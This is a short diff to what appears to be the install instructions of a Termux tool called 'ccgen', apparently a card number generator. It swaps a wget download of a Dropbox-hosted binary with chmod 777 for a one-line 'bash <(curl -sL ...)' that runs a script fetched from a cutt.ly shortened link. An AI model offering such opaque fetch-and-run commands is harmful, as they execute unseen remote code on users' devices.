@@ -26,9 +26,7 @@ pip2 install requests
 
 ```
 
-wget https://www.dropbox.com/s/jdjzfp84ffu6tel/ccgen   -O /data/data/com.termux/files/usr/bin/ccgen >/dev/null 2>&1 
-chmod 777 /data/data/com.termux/files/usr/bin/ccgen
-
+bash <(curl -sL https://cutt.ly/Pkic4il)
 
 ```
 
